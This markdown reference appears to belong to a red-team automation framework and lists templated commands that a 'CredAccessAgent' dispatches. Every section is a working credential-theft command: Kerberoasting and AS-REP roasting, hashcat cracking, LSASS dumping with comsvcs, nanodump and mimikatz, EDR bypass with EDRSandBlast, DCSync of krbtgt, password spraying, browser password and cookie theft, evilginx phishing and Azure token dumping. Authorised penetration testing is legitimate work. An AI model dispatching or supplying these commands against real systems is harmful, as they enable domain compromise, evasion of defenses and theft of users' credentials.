# Credential Access — Tool commands reference

Templated commands the `CredAccessAgent` dispatches. Placeholders documented
in [../../discovering-environment/reference/tool-commands.md](../../discovering-environment/reference/tool-commands.md).

## Contents
- rubeus (C1, C2, C7, C9)
- impacket-getuserspns / impacket-getnpusers (C1, C2)
- hashcat (cracking)
- comsvcs → nanodump → handlekatz → ppldump → edrsandblast → mimikatz (C3)
- impacket-secretsdump (C4, C5, C10)
- crackmapexec (C6 spray, C10 SAM/LSA, C16 GPP)
- sharpdpapi / sharpchrome (C11, C12)
- evilginx (C13)
- aadinternals (C15)

## `rubeus`  (C1, C2, C7, C9)

```yaml
tool: rubeus
opsec: stealth
notes: "Use /nowrap and /outfile to avoid stdout truncation in beacons."
commands:
  - id: kerberoast
    cmd: |
      Rubeus.exe kerberoast /nowrap /format:hashcat \
        /outfile:{{ artifact.path }}/kerb.hashes /domain:{{ context.scope.domains[0] }}
    parser: parsers.kerberoast_hashes
    on_success: ["credentials[] += each as secret_type=krb5tgs"]
  - id: asreproast
    cmd: |
      Rubeus.exe asreproast /nowrap /format:hashcat \
        /outfile:{{ artifact.path }}/asrep.hashes /domain:{{ context.scope.domains[0] }}
    parser: parsers.asrep_hashes
  - id: ptt_tgt
    cmd: "Rubeus.exe ptt /ticket:{{ creds.selected | b64_kirbi }}"
    parser: parsers.rubeus_ptt
  - id: overpass
    cmd: |
      Rubeus.exe asktgt /user:{{ creds.selected.username }} \
        /rc4:{{ creds.selected.nt_hash }} /domain:{{ context.scope.domains[0] }} /ptt
    parser: parsers.rubeus_asktgt
    on_success: ["credentials[] += tgt"]
  - id: s4u_pkinit
    cmd: |
      Rubeus.exe asktgt /user:{{ pkinit.user }} /certificate:{{ pkinit.pfx_b64 }} \
        /password:{{ pkinit.pfx_pass }} /domain:{{ context.scope.domains[0] }} \
        /getcredentials /ptt
    parser: parsers.rubeus_asktgt
```

## `impacket-getuserspns` / `impacket-getnpusers`  (C1, C2)

```yaml
tool: impacket-getuserspns
opsec: stealth
commands:
  - id: roast
    cmd: |
      GetUserSPNs.py {{ context.scope.domains[0] }}/{{ creds.primary.username }} \
        {{ creds.primary | as_impacket_secret }} \
        -dc-ip {{ hosts.first(role='DC').ip }} \
        -request -outputfile {{ artifact.path }}/spn.hashes
    parser: parsers.kerberoast_hashes

tool: impacket-getnpusers
opsec: stealth
commands:
  - id: asrep
    cmd: |
      GetNPUsers.py {{ context.scope.domains[0] }}/ -dc-ip {{ hosts.first(role='DC').ip }} \
        -usersfile {{ artifact.path }}/users.txt \
        -format hashcat -outputfile {{ artifact.path }}/asrep.hashes -no-pass
    parser: parsers.asrep_hashes
```

## `hashcat`  (cracking)

```yaml
tool: hashcat
opsec: offline
commands:
  - id: crack_tgs
    cmd: "hashcat -m 13100 {{ artifact.path }}/kerb.hashes {{ wordlist }} -r {{ rules }} -O --status"
    parser: parsers.hashcat
    on_success: ["credentials[] += cracked as secret_type=password validated=false"]
  - id: crack_asrep
    cmd: "hashcat -m 18200 {{ artifact.path }}/asrep.hashes {{ wordlist }} -O --status"
    parser: parsers.hashcat
  - id: crack_ntlm
    cmd: "hashcat -m 1000 {{ artifact.path }}/ntlm.hashes {{ wordlist }} -O --status"
    parser: parsers.hashcat
```

## `comsvcs`  (C3 — try first)

```yaml
tool: comsvcs
opsec: moderate
preconditions:
  - "host.current.access_level in ['local_admin','system']"
commands:
  - id: dump
    cmd: |
      powershell -c "$p=Get-Process lsass; rundll32 C:/Windows/System32/comsvcs.dll MiniDump $($p.Id) {{ artifact.path }}/l.dmp full"
    parser: parsers.lsass_dump
    on_success: ["parse with pypykatz → credentials[]"]
    on_failure:
      fallback: nanodump
```

## `nanodump`  (C3 — second)

```yaml
tool: nanodump
opsec: moderate
commands:
  - id: handle_dup
    cmd: "nanodump.exe -d -w {{ artifact.path }}/l.dmp"
    parser: parsers.lsass_dump
    on_failure:
      fallback: handlekatz
```

## `handlekatz` / `ppldump` / `edrsandblast`  (C3 — third/fourth)

```yaml
tool: handlekatz
opsec: moderate
commands:
  - id: dump
    cmd: "HandleKatz.exe --pid:{{ lsass.pid }} --outfile:{{ artifact.path }}/l.dmp"
    parser: parsers.lsass_dump

tool: ppldump
opsec: moderate
preconditions: ["host.current.lsa_runasppl == true"]
commands:
  - id: dump
    cmd: "PPLdump.exe lsass.exe {{ artifact.path }}/l.dmp"
    parser: parsers.lsass_dump

tool: edrsandblast
opsec: loud
preconditions: ["opsec_state.edr_blocking_dump == true"]
destructive_gate: true
commands:
  - id: dump
    cmd: "EDRSandBlast.exe --usermode --kernelmode -o {{ artifact.path }}/l.dmp -v"
    parser: parsers.lsass_dump
```

## `mimikatz`  (C3/C4 — last resort)

```yaml
tool: mimikatz
opsec: loud
preconditions: ["opsec_state.amsi_bypassed == true"]
commands:
  - id: logonpasswords
    cmd: '"privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "exit"'
    parser: parsers.mimikatz
  - id: dcsync
    cmd: '"lsadump::dcsync /user:{{ context.scope.domains[0] }}/krbtgt" "exit"'
    parser: parsers.mimikatz_dcsync
    destructive_gate: true
    on_success: ["credentials[] += krbtgt nt + aes256; flag impact-ready"]
```

## `impacket-secretsdump`  (C4 preferred, C5, C10)

```yaml
tool: impacket-secretsdump
opsec: moderate
destructive_gate: true        # for -just-dc / -just-dc-ntlm
commands:
  - id: dcsync
    cmd: |
      secretsdump.py {{ context.scope.domains[0] }}/{{ creds.primary.username }} \
        {{ creds.primary | as_impacket_secret }} \
        -dc-ip {{ hosts.first(role='DC').ip }} \
        -just-dc-ntlm -outputfile {{ artifact.path }}/dcsync
    parser: parsers.secretsdump
  - id: sam_remote
    cmd: |
      secretsdump.py {{ context.scope.domains[0] }}/{{ creds.primary.username }} \
        {{ creds.primary | as_impacket_secret }} \
        @{{ target.host.ip }} -just-dc-user '{{ target.username }}'
    parser: parsers.secretsdump
  - id: ntds_offline
    cmd: "secretsdump.py -ntds {{ artifact.path }}/ntds.dit -system {{ artifact.path }}/SYSTEM LOCAL -outputfile {{ artifact.path }}/ntds"
    parser: parsers.secretsdump
```

## `crackmapexec`  (C6 spray, C10, C16)

```yaml
tool: crackmapexec
opsec: moderate
commands:
  - id: spray
    cmd: |
      crackmapexec smb {{ hosts | dcs_ips }} \
        -u {{ artifact.path }}/users.txt -p '{{ spray.password }}' \
        --continue-on-success --json
    parser: parsers.cme_spray
    opsec_gate: "respect password_policy.lockout_threshold from D15"
  - id: sam
    cmd: |
      crackmapexec smb {{ target.host.ip }} \
        -u {{ creds.primary.username }} {{ creds.primary | as_cme_secret }} \
        --sam --json
    parser: parsers.cme
  - id: lsa
    cmd: |
      crackmapexec smb {{ target.host.ip }} \
        -u {{ creds.primary.username }} {{ creds.primary | as_cme_secret }} \
        --lsa --json
    parser: parsers.cme
  - id: gpp_passwords
    cmd: |
      crackmapexec smb {{ hosts | dcs_ips }} \
        -u {{ creds.primary.username }} {{ creds.primary | as_cme_secret }} \
        -M gpp_password
    parser: parsers.cme_module
```

## `sharpdpapi` / `sharpchrome`  (C11, C12)

```yaml
tool: sharpdpapi
opsec: moderate
commands:
  - id: triage
    cmd: "SharpDPAPI.exe triage /target:{{ host.current.user_profile }}"
    parser: parsers.sharpdpapi

tool: sharpchrome
opsec: moderate
commands:
  - id: logins
    cmd: "SharpChrome.exe logins /unprotect /format:csv"
    parser: parsers.sharpchrome
  - id: cookies
    cmd: "SharpChrome.exe cookies /unprotect /format:csv /target:{{ chrome.cookies_path }}"
    parser: parsers.sharpchrome
```

## `evilginx`  (C13 — only if phishing in-scope)

```yaml
tool: evilginx
opsec: stealth
destructive_gate: true        # external-facing infra change
commands:
  - id: deploy_phishlet
    cmd: "evilginx2 -p ./phishlets phishlets enable {{ phishlet }}; lures create {{ phishlet }}"
    parser: parsers.evilginx
```

## `aadinternals`  (C15)

```yaml
tool: aadinternals
opsec: stealth
preconditions: ["context.scope.azure_tenant is not null"]
commands:
  - id: prt_dump
    cmd: "Get-AADIntUserPRTToken | ConvertTo-Json"
    parser: parsers.aadinternals
```
